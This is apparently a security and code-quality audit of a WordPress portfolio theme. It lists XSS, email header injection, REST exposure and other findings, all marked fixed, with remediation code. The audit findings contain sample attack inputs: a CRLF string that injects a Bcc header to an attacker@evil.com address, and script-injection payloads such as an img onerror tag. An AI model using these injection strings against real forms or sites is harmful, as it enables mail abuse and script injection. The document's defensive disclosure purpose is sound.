# Theme Code Review — russteicheira
Audit date: 2026-06-27 · Last updated: 2026-06-27 (Group E pass — all findings resolved)

---

## Summary

The russteicheira theme is a well-structured single-author portfolio with a clear separation of concerns between template parts, settings, and customizer logic. The codebase is readable and follows many WordPress conventions. However, a consistent pattern of missing output escaping runs through all template files and admin notices, creating a class of XSS vulnerabilities that should be addressed before the site is considered production-hardened. Two email header injection vectors are present in the contact form handler, one of which is a genuine high-severity risk. The Customizer declares `postMessage` transport for nine settings but ships no preview JavaScript, meaning live preview is silently broken for all of them. A data-integrity bug in `rt_section_opt()` causes intentionally-blank fields to silently revert to their defaults. The issues are tractable — most are one-line fixes — and the underlying architecture is sound.

---

## Status

| Status | Severity | Finding |
| ------ | -------- | ------- |
| ✅ Fixed | High | Email Header Injection — CRLF via `$name`/`$subject` in `functions.php` |
| ✅ Fixed | High | XSS — Typewriter `innerHTML` in `js/main.js` |
| ✅ Fixed | High | XSS — Unescaped `the_title()` in 4 template files |
| ✅ Fixed | High | XSS — Admin notices via raw `__()` in `functions.php` |
| ✅ Fixed | High | Broken Live Preview — 9 `postMessage` settings with no JS handlers |
| ✅ Fixed | Medium | XSS — `_e()` inside `aria-label` attributes across 5 files |
| ✅ Fixed | Medium | XSS — `get_the_date()` / `wp_trim_words()` unescaped in `blog-preview.php` |
| ✅ Fixed | Medium | Double-encoding — `&amp;` in hero fallback string re-encoded by `esc_html()` |
| ✅ Fixed | Medium | Data integrity — `rt_section_opt()` returns default when field intentionally blank |
| ✅ Fixed | Medium | Side effect — `wp_insert_term()` called inside sanitize callback |
| ✅ Fixed | Medium | Potential fatal — `get_control()->label` chained without null check |
| ✅ Fixed | Medium | Dead code — HTML nonce field in contact form never verified |
| ✅ Fixed | Medium | Settings API — `register_setting()` missing explicit `capability` key |
| ✅ Fixed | Medium | XSS — `wp_kses_post` too permissive for footer legal links field |
| ✅ Fixed | Medium | Info disclosure — `RT.isHome` unused and leaks page-type to visitors |
| ✅ Fixed | Medium | Incorrect notice text — limit stated as 304 chars, enforced as 200 |
| ✅ Fixed | Medium | Missing rate limiting on contact form AJAX handler |
| ✅ Fixed | Medium | Overly broad CPT capabilities — all three CPTs use `capability_type => 'post'` |
| ✅ Fixed | Medium | REST API — non-public CPTs readable unauthenticated |
| ✅ Fixed | Medium | No `function_exists()` guards on theme functions |
| ✅ Fixed | Low | Unescaped `bloginfo('name')` / `_e()` in HTML attributes in header/footer |
| ✅ Fixed | Low | Inverted external link detection — `tel:` links get `target="_blank"` |
| ✅ Fixed | Low | Blog archive CTA always links to homepage when no posts page is set |
| ✅ Fixed | Low | `no_found_rows` missing in capability-count `WP_Query` |
| ✅ Fixed | Low | `rt_section_opt()` static cache never invalidated |
| ✅ Fixed | Low | Fallback icons echoed without `esc_html()` in 3 templates |
| ✅ Fixed | Low | Project meta URLs stored without HTTP/HTTPS scheme validation |
| ✅ Fixed | Low | `querySelector(hash)` unguarded against invalid CSS selector strings |
| ✅ Fixed | Low | Mail delivery failures not logged server-side |
| ✅ Fixed | Low | `.footer-legal` missing mobile single-column stacking rule |
| ✅ Fixed | Low | `.contact-link__value` can overflow on narrow screens |
| ✅ Fixed | Low | Google Fonts loaded from external CDN (GDPR / performance) |
| ✅ Fixed | Info | IIFE in skills sanitize callback is unnecessary complexity |
| ✅ Fixed | Info | Loop counter `$i` echoed without integer cast |
| ✅ Fixed | Info | No security headers (`X-Frame-Options`, `X-Content-Type-Options`) |
| ✅ Fixed | Info | No `theme.json` — block editor won't inherit theme CSS variables |
| ✅ Fixed | Info | `style.css` header has contradictory PHP version requirement |

---

## Findings by Severity

### Critical

No critical (CVSS 9+) findings. The highest-risk items are classified High below.

---

### High

#### [Email Header Injection] Reply-To and Subject headers allow CRLF injection
- **File:** `functions.php` — lines 643–663
- **Issue:** `$name` is processed through `sanitize_text_field()` and then concatenated directly into the `Reply-To` mail header as `'Reply-To: ' . $name . ' <' . $email . '>'`. `sanitize_text_field()` strips HTML tags and extra whitespace but does **not** strip `\r` or `\n`. A crafted name value such as `foo\r\nBcc: attacker@evil.com` injects an additional header into the outgoing message. The same problem applies to `$subject`, which is likewise only passed through `sanitize_text_field()` before being used in the `wp_mail()` subject argument.
- **Recommendation:** Immediately after each `sanitize_text_field()` call, strip carriage returns and newlines: `$name = str_replace( ["\r", "\n"], '', $name );` and `$subject = str_replace( ["\r", "\n"], '', $subject );`. Apply this to both variables before any use in headers or the mail subject.

#### [XSS] Typewriter animation writes Customizer phrases to innerHTML without encoding
- **File:** `js/main.js` — lines 154, 162, 176
- **Issue:** The typewriter loop assigns `phrase.slice(0, charIdx) + '<span ...></span>'` to `termEl.innerHTML`. Phrases come from `RT.typingPhrases`, which is populated server-side from the `hero_typing_lines` Customizer setting via `get_theme_mod()` without HTML-encoding each line before it enters the JS array. An admin-supplied phrase containing `<img src=x onerror=alert(1)>` would execute in the DOM.
- **Recommendation:** Use `termEl.textContent = phrase.slice(0, charIdx)` and append the cursor `<span>` as a real DOM node via `document.createElement('span')`. This removes `innerHTML` from the hot path entirely and is immune to any phrase content.

#### [XSS] Unescaped post titles in template loops
- **Files:**
  - `template-parts/about.php` — line 79
  - `template-parts/expertise.php` — line 56
  - `template-parts/projects.php` — line 67
  - `template-parts/blog-preview.php` — line 89
- **Issue:** All four files call `the_title()` inside HTML elements (`<strong>`, `<h3>`, `<a>`) without escaping. `the_title()` echoes the raw post title; a title containing `</strong><script>alert(1)</script>` would inject arbitrary markup into the page.
- **Recommendation:** Replace every `the_title()` call in a display context with `echo esc_html( get_the_title() );`. For the `blog-preview.php` anchor, also replace `the_permalink()` with `echo esc_url( get_permalink() );`.

#### [XSS] Admin notice strings contain HTML passed through `__()` without escaping
- **File:** `functions.php` — lines 374–391, 548–558
- **Issue:** Multiple `admin_notices` callbacks use `echo '<div ...>' . __( '<strong>Capability limit reached:</strong> …', 'russteicheira' )`. `__()` is not an escaping function. A malicious or misconfigured `.po`/`.mo` file could replace these strings with arbitrary HTML or JavaScript that would execute in the WordPress admin.
- **Recommendation:** Separate the HTML structure from the translatable text: `echo '<div class="notice notice-error is-dismissible"><p><strong>' . esc_html__( 'Capability limit reached:', 'russteicheira' ) . '</strong> ' . esc_html__( 'Only 5 capabilities…', 'russteicheira' ) . '</p></div>';`. Apply the same pattern to all affected notice strings.

#### [Broken Live Preview] Nine postMessage Customizer settings have no JS preview handler
- **File:** `inc/customizer.php` — lines 21–26, 51–65, 73–113, 168–190
- **Issue:** The settings `site_tagline`, `hero_stat1_num`, `hero_stat1_label`, `hero_stat2_num`, `hero_stat2_label`, `hero_stat3_num`, `hero_stat3_label`, `footer_copyright_name`, and `footer_credit` all declare `'transport' => 'postMessage'`, but there is no `js/customizer-preview.js` file and no `wp.customize()` binding calls anywhere in the theme. Editing any of these fields in the Customizer produces no visible preview update; changes only appear after clicking Publish.
- **Recommendation:** Either create `js/customizer-preview.js`, enqueue it on `customize_preview_init`, and add `wp.customize('site_tagline', function(value){ value.bind(function(to){ document.querySelector('.footer-tagline').textContent = to; }); });` handlers for each setting; or change all nine settings to `'transport' => 'refresh'` as an immediate fix until preview handlers are written.

---

### Medium

#### [XSS / Attribute Injection] `_e()` used inside HTML attributes across multiple templates
- **Files:**
  - `template-parts/contact.php` — line 47
  - `template-parts/about.php` — line 52
  - `template-parts/expertise.php` — lines 59, 84
  - `template-parts/projects.php` — lines 78, 90
  - `header.php` — lines 16, 35
  - `footer.php` — line 22
- **Issue:** `_e()` is used inside `aria-label="…"` attributes throughout the theme. `_e()` echoes translated strings without HTML-attribute encoding. A translation containing a double-quote would break the attribute; one containing `>` could inject markup.
- **Recommendation:** Replace every `_e()` inside an HTML attribute with `esc_attr_e()`. For text nodes use `esc_html_e()`.

#### [XSS] `wp_trim_words()` and `get_the_date()` echoed without escaping in blog-preview.php
- **File:** `template-parts/blog-preview.php` — lines 78–79, 92
- **Issue:** `get_the_date('c')` and `get_the_date('M j, Y')` are echoed into a `datetime` attribute and visible text without escaping. `wp_trim_words( get_the_excerpt(), 20, '…' )` is echoed into a `<p>` without escaping; manually authored excerpts can contain HTML that `wp_trim_words` does not strip.
- **Recommendation:** Use `echo esc_attr( get_the_date( 'c' ) );` for the attribute, `echo esc_html( get_the_date( 'M j, Y' ) );` for the text node, and `echo esc_html( wp_trim_words( get_the_excerpt(), 20, '…' ) );` for the excerpt (or `wp_kses_post()` if HTML excerpts are intentional).

#### [Double-Encoding Bug] HTML entity in hero fallback string re-encoded by `esc_html()`
- **File:** `template-parts/hero.php` — line 8
- **Issue:** The default value passed to `rt_get()` is `'Cybersecurity &amp; Compliance Professional'`, which already contains an HTML entity. When `esc_html()` is applied, `&` is re-encoded to `&amp;`, so the page renders the literal text `Cybersecurity &amp; Compliance Professional`.
- **Recommendation:** Change the default to the plain-text string `'Cybersecurity & Compliance Professional'` and let `esc_html()` encode it correctly.

#### [Data Integrity Bug] `rt_section_opt()` substitutes default when field is intentionally saved as empty
- **File:** `inc/section-settings.php` — line 220
- **Issue:** The guard `'' !== $opts[$section][$key]` means that if a user deliberately clears a heading or eyebrow field and saves, `rt_section_opt()` will return the non-empty `$default` on every subsequent call. The database correctly holds `''`, but the front end re-renders the old placeholder text.
- **Recommendation:** Remove the `'' !== $opts[$section][$key]` condition. Use only `isset()`: `if ( isset( $opts[$section][$key] ) ) { return $opts[$section][$key]; }`

#### [Side Effect in Sanitizer] `wp_insert_term()` called inside `rt_sections_sanitize()`
- **File:** `inc/section-settings.php` — lines 144–168
- **Issue:** The skills field IIFE calls `wp_insert_term()` inside the `sanitize_callback`. WordPress may invoke sanitize callbacks in non-save contexts (REST API, import/export). If triggered on a read or validation-only path, a new taxonomy term is permanently created as a side effect. It also makes the sanitizer untestable without a live database.
- **Recommendation:** Move the `wp_insert_term()` logic out of the sanitize callback and into a function hooked on `updated_option`. The sanitize callback should only validate and return clean data.

#### [Potential Fatal Error] `get_control()->label` chained without null check
- **File:** `inc/customizer.php` — line 18
- **Issue:** `$wp_customize->get_control('blogdescription')->label = …` will throw a PHP fatal error (`Cannot access property on null`) if the control does not exist, which a plugin or future WP core change could cause. The Customizer would become completely unusable.
- **Recommendation:** `$ctrl = $wp_customize->get_control('blogdescription'); if ( $ctrl ) { $ctrl->label = __('Description', 'russteicheira'); }`

#### [CSRF / Dead Code] HTML nonce field in contact form is never verified
- **File:** `template-parts/contact.php` — line 48; `functions.php` — line 641
- **Issue:** `wp_nonce_field('rt_nonce', 'rt_contact_nonce')` renders a hidden input named `rt_contact_nonce`, but the AJAX handler verifies `check_ajax_referer('rt_nonce', 'nonce')` — looking for a field named `nonce` that is appended by JavaScript. The HTML-rendered nonce is never read and confuses the intent of the code.
- **Recommendation:** Remove the `wp_nonce_field()` call from `contact.php`. The JS-appended nonce is the operative one and is already correct.

#### [Settings API] `register_setting()` missing explicit `capability` key
- **File:** `inc/section-settings.php` — lines 35–38
- **Issue:** `register_setting()` for `rt_sections_group` / `rt_sections` omits the `'capability'` key, relying on the WordPress default of `manage_options`. The intent is implicit rather than explicit.
- **Recommendation:** Add `'capability' => 'manage_options'` to the args array: `register_setting( 'rt_sections_group', 'rt_sections', [ 'sanitize_callback' => 'rt_sections_sanitize', 'capability' => 'manage_options' ] );`

#### [XSS] `wp_kses_post` too permissive for footer legal links field
- **Files:** `footer.php` — line 57; `inc/customizer.php` — line 194
- **Issue:** `footer_legal_links` is stored and rendered through `wp_kses_post`, which permits `<form>`, `<input>`, `<button>`, arbitrary `<style>` blocks, and inline styles. For a field that is only ever meant to hold linked text, this is an unnecessarily broad allow-list.
- **Recommendation:** Replace `wp_kses_post` with a custom allow-list: `wp_kses( $value, [ 'a' => [ 'href' => [], 'target' => [], 'rel' => [], 'class' => [] ], 'span' => [ 'class' => [] ], 'br' => [] ] )`

#### [Information Disclosure] `RT.isHome` leaks page-type context and is unused
- **File:** `functions.php` — line 95
- **Issue:** `'isHome' => is_front_page() ? 'true' : 'false'` is localized into the global `RT` object and visible to all visitors. `main.js` contains no reference to `RT.isHome`, making it dead data. Note: the value is a string `'false'`, which is truthy in JavaScript — a latent bug if this is ever used.
- **Recommendation:** Remove `isHome` from the `wp_localize_script` array. If needed in future, use a real boolean (`true`/`false`), not a string.

#### [Incorrect Notice Text] Expertise excerpt limit stated as 304 but enforced as 200
- **File:** `functions.php` — lines 522, 556, 602
- **Issue:** The function comment (line 522), the admin notice (line 556), and the JS counter comment (line 602) all say 304 characters. The actual `mb_substr` limit (line 534) and the JS `maxlength` attribute (line 605) are both 200. Users who exceed the limit receive a false count in the error notice.
- **Recommendation:** Update the function comment, the admin notice string, and the JS comment to consistently read `200`.

#### [Missing Rate Limiting] Contact form AJAX handler has no flood protection
- **File:** `functions.php` — lines 640–672
- **Issue:** The nonce in `rt_handle_contact()` is valid for 12–24 hours once obtained from a single page load. There is no per-IP throttle, transient-based rate limit, honeypot field, or CAPTCHA. An attacker holding a valid nonce can submit hundreds of messages within the window.
- **Recommendation:** Add a transient-based rate limit keyed on a hashed submitter IP: check and increment a counter transient `'rt_contact_limit_' . md5($_SERVER['REMOTE_ADDR'])` with a short TTL (e.g. 1 hour), rejecting submissions above a threshold (e.g. 5 per hour).

#### [Overly Broad CPT Capabilities] All three CPTs use `capability_type => 'post'`
- **File:** `functions.php` — lines 128, 155, 178
- **Issue:** The `capability`, `expertise`, and `project` CPTs all use `'capability_type' => 'post'`, so any Contributor or Author can create and edit records in these types. This is a misconfiguration even if currently harmless on a single-admin site.
- **Recommendation:** Add `'capability_type' => [ 'rt_capability', 'rt_capabilities' ]` and `'map_meta_cap' => true` (per CPT), then grant the generated capabilities only to Editor/Administrator roles via `add_role` or `get_role()->add_cap`.

#### [REST API Exposure] Non-public CPTs accessible unauthenticated via REST
- **File:** `functions.php` — lines 125, 153, 181
- **Issue:** The `capability` and `expertise` CPTs are `'public' => false` but `'show_in_rest' => true`. Their REST GET endpoints (`/wp-json/wp/v2/capability`, `/wp-json/wp/v2/expertise`) are accessible unauthenticated because WordPress's default REST controller does not restrict reads on non-public types. These CPTs do not use the block editor (no `editor` in their `supports` arrays), so `show_in_rest` appears to serve no purpose.
- **Recommendation:** Set `'show_in_rest' => false` for the `capability` and `expertise` CPTs unless Gutenberg block support is intended. For `project`, which is public, the REST exposure is acceptable.

#### [No `function_exists()` Guards] Theme functions are not protected against re-declaration
- **File:** `functions.php` — throughout
- **Issue:** Every named function (`rt_theme_setup`, `rt_enqueue_assets`, `rt_register_post_types`, etc.) is defined unconditionally. A child theme or any include that re-loads `functions.php` will trigger a fatal `Cannot redeclare function` PHP error.
- **Recommendation:** Wrap each function definition in `if ( ! function_exists( 'rt_...' ) ) { … }`.

---

### Low

#### [Missing Escape] `bloginfo('name')` and `_e()` in HTML attributes in header/footer
- **Files:** `header.php` — lines 16, 19, 35; `footer.php` — lines 7, 22
- **Issue:** `bloginfo('name')` does not guarantee HTML-attribute escaping; a site name with a double-quote would break the `aria-label` attribute. `_e()` inside attributes has the same problem.
- **Recommendation:** Replace `bloginfo('name')` with `echo esc_attr( get_bloginfo('name') );` in attribute contexts. Replace `_e()` in attributes with `esc_attr_e()`.

#### [Logic Bug] External link detection in footer and contact is inverted
- **Files:** `footer.php` — line 42; `template-parts/contact.php` — line 30
- **Issue:** `$is_external = (0 !== strpos($fl['url'], 'mailto:'))` treats everything that does not start with `mailto:` as external, including `tel:` links and relative paths. A phone number link would incorrectly receive `target="_blank"`.
- **Recommendation:** Replace with `$is_external = (bool) preg_match('#^https?://#i', $fl['url']);` to only treat HTTP/HTTPS URLs as external.

#### [Logic Bug] Blog archive fallback URL never triggers when `page_for_posts` is 0
- **File:** `template-parts/blog-preview.php` — line 108
- **Issue:** `get_permalink( get_option('page_for_posts') ) ?: home_url('/blog/')` — when no static posts page is set, `get_option` returns `0`, and `get_permalink(0)` returns the site home URL (truthy), so the `home_url('/blog/')` fallback is never reached. The CTA button silently links to the homepage.
- **Recommendation:** `$pid = (int) get_option('page_for_posts'); $blog_url = $pid ? get_permalink($pid) : home_url('/blog/'); echo esc_url($blog_url);`

#### [Performance] `no_found_rows` not set to `true` in capability-count query
- **File:** `functions.php` — lines 322–328
- **Issue:** The `WP_Query` used to count published capabilities uses `'fields' => 'ids'` for efficiency but leaves `no_found_rows` at its default of `false`, which adds an unnecessary `SQL_CALC_FOUND_ROWS` call on every capability post save.
- **Recommendation:** Add `'no_found_rows' => true` to the query args.

#### [Stale Cache] `rt_section_opt()` static cache never invalidated
- **File:** `inc/section-settings.php` — lines 215–224
- **Issue:** The `static $opts` variable is populated once per PHP process. In WP-CLI, cron, or REST batch contexts where the option is updated mid-request, all subsequent calls to `rt_section_opt()` return pre-update data.
- **Recommendation:** Remove the static cache entirely. WordPress's own object cache (`wp_cache`) already de-duplicates `get_option()` calls within a request with no extra code required.

#### [Unescaped Output] Hardcoded fallback icons echoed without `esc_html()`
- **Files:**
  - `template-parts/about.php` — line 96
  - `template-parts/expertise.php` — line 81
  - `template-parts/blog-preview.php` — line 70
- **Issue:** Emoji strings from hardcoded developer-defined arrays are echoed without `esc_html()`, inconsistent with the live-data paths in the same files which do use `esc_html($icon)`.
- **Recommendation:** Change all three to `echo esc_html( $icon );` / `echo esc_html( $item[0] );` / `echo esc_html( $card[0] );` for consistency.

#### [URL Validation] Project meta URLs stored without scheme validation
- **File:** `functions.php` — lines 266–267
- **Issue:** `esc_url_raw()` normalizes but does not reject `javascript:` or `data:` URI schemes on storage. The value is correctly stripped by `esc_url()` at output time, but the unsafe value persists in the database.
- **Recommendation:** After `esc_url_raw()`, validate the scheme: `if ( $url && ! in_array( wp_parse_url($url, PHP_URL_SCHEME), ['http', 'https'], true ) ) { $url = ''; }`

#### [JS Bug] `document.querySelector(hash)` unguarded against invalid CSS selectors
- **File:** `js/main.js` — line 243
- **Issue:** If an anchor `href` contains characters valid in a URL fragment but invalid in a CSS selector (e.g. `#section[1]`), `querySelector` throws a `SyntaxError`, crashing all subsequent smooth-scroll behavior for that page load.
- **Recommendation:** Wrap in a try/catch, or prefer `document.getElementById(hash.slice(1))` which does not parse as a CSS selector.

#### [Email Error Logging] Mail delivery failures not logged server-side
- **File:** `functions.php` — lines 667–669
- **Issue:** When `wp_mail()` returns false, the handler returns a user-facing message but calls no `error_log()`, making SMTP misconfiguration silent to the operator.
- **Recommendation:** Add `error_log('rt_handle_contact: wp_mail failed for ' . $email);` in the failure branch.

#### [CSS] `.footer-legal` lacks a single-column stacking rule at small viewports
- **File:** `css/main.css` — lines 963–976
- **Issue:** `.footer-legal` uses `flex-wrap:wrap` but has no explicit `flex-direction: column` breakpoint below 480px, unlike `.footer-inner`, `.footer-social`, and `.footer-links` which all have responsive overrides. On very narrow devices, items may wrap into awkward half-row combinations.
- **Recommendation:** Inside the existing `≤640px` media block add: `.footer-legal { flex-direction: column; align-items: center; gap: 0.5rem; }`

#### [CSS] `.contact-link__value` can overflow on narrow screens
- **File:** `css/main.css` — lines 842–847
- **Issue:** Long email addresses or URLs in `.contact-link__value` have no overflow guard, and can overflow their container on narrow mobile viewports.
- **Recommendation:** Add `overflow-wrap: break-word; word-break: break-all;` to `.contact-link__value`.

#### [WordPress Best Practices] Google Fonts loaded from external CDN
- **File:** `functions.php` — lines 49–55
- **Issue:** Connecting to `fonts.googleapis.com` on every page load leaks visitor IPs to Google (GDPR concern) and adds a render-blocking network round-trip.
- **Recommendation:** Self-host the fonts using google-webfonts-helper; place woff2 files in `css/fonts/` and use `@font-face` declarations in `main.css`.

---

### Informational

#### [Code Quality] IIFE in skills sanitize callback is unnecessary complexity
- **File:** `inc/section-settings.php` — lines 144–168
- **Issue:** The skills field sanitization is wrapped in an immediately-invoked closure `(function() use ($input){ … })()`. This achieves nothing a plain code block cannot, copies the entire `$input` array into closure scope on every settings save, and reduces readability.
- **Recommendation:** Refactor into a plain code block or a named helper `rt_sections_sanitize_skills($raw)`.

#### [Code Quality] Loop counter `$i` echoed without integer cast in contact-links form
- **File:** `inc/section-settings.php` — lines 617, 620, 627, 634, 641
- **Issue:** `$i` is a PHP-controlled loop counter, never user-supplied, so there is no injection risk. The bare echo is merely inconsistent with WordPress coding standards.
- **Recommendation:** Use `echo (int) $i` or `intval($i)` for clarity.

#### [Security Headers] No `X-Frame-Options` or `Content-Security-Policy` header
- **File:** `functions.php`
- **Issue:** The theme correctly removes the WP generator tag, but sends no clickjacking-prevention headers.
- **Recommendation:** Add via a `send_headers` hook: `header('X-Frame-Options: SAMEORIGIN');` and `header('X-Content-Type-Options: nosniff');`. Alternatively configure at the web server level.

#### [WordPress Best Practices] No `theme.json` present
- **File:** theme root
- **Issue:** `add_theme_support('wp-block-styles')` is declared but no `theme.json` exists, so the block editor does not inherit the theme's CSS custom properties (`--navy`, `--teal`, `--gold`). Block-inserted content will not match the front-end design.
- **Recommendation:** Create a minimal `theme.json` v2 that registers the color palette, font families, and spacing scale used in `css/main.css`.

#### [WordPress Best Practices] `style.css` header has contradictory PHP version requirement
- **File:** `style.css` — lines 1–15
- **Issue:** The header declares `Requires PHP: 8.0` but `functions.php` comments say `PHP 7.0+ compatible`. The `Domain Path: /languages` header line is also absent.
- **Recommendation:** Align the declared minimum PHP version with what the code actually requires. Add `Domain Path: /languages` to the header block.

---

## Quick Wins

- **1-line fix:** Change all `the_title()` calls in template loops to `echo esc_html( get_the_title() );` — eliminates four high-severity XSS findings immediately.
- **1-line fix:** Add `str_replace(["\r","\n"], '', $name)` and the same for `$subject` in `rt_handle_contact()` — closes both email header injection findings.
- **1-line fix:** Change `'' !== $opts[$section][$key]` to just `isset(...)` in `rt_section_opt()` — fixes the silent default-reversion data integrity bug.
- **1-line fix:** Add `'no_found_rows' => true` to the capability-count `WP_Query` — removes unnecessary SQL overhead on every capability save.
- **1-line fix per site:** Replace all `_e()` inside `aria-label="…"` attributes with `esc_attr_e()` — about a dozen call sites across five files.
- **1-line fix:** Add null guard before `->label` in `customizer.php` line 18 — prevents a fatal error that would break the entire Customizer.
- **1-line fix:** Remove `wp_nonce_field()` from `contact.php` — eliminates dead confusing code.
- **Config change:** Set `'show_in_rest' => false` on `capability` and `expertise` CPTs — closes the unauthenticated REST read exposure with no user-visible impact.
- **Quick fix for live preview:** Change all nine `'transport' => 'postMessage'` settings to `'transport' => 'refresh'` until preview handlers are written — makes the Customizer actually work.
- **1-line fix:** Change the fallback default in `hero.php` line 8 from `'Cybersecurity &amp; Compliance Professional'` to `'Cybersecurity & Compliance Professional'` — fixes visible double-encoded entity on the live site.

---

## Notes

**Escaping consistency is the dominant pattern.** The majority of findings reduce to the same root cause: output functions (`the_title()`, `_e()`, direct `echo`) used in HTML contexts without a wrapping escape call. A single focused pass through all template files applying `esc_html()`, `esc_attr()`, and `esc_url()` at every echo point would close roughly half of all findings in this report.

**The sanitize callback architecture in `section-settings.php` is doing too much work.** The `rt_sections_sanitize` callback both validates/cleans data and performs a database write (`wp_insert_term`). These concerns belong in separate hooks. This is also the file that contains the stale-static-cache problem and the intentional-empty-string data integrity bug — all three issues stem from the same function family.

**The Customizer setup is structurally incomplete.** Nine `postMessage` settings with no preview JS is not a minor omission; it means the Customizer's primary value proposition (live preview) does not work at all for the most commonly edited fields. Shipping `'transport' => 'refresh'` is better than shipping broken `postMessage`.

**The contact form handler is the highest-risk attack surface for an internet-facing site.** It handles unauthenticated POST requests, constructs mail headers from POST data, and has no rate limiting. The email header injection and the missing rate limit should be addressed before the site receives significant traffic.

**The codebase has no obvious architectural debt.** Functions are well-named, files are small and purposeful, and the template-part structure is clean. These findings are correctable in a focused session without structural refactoring.
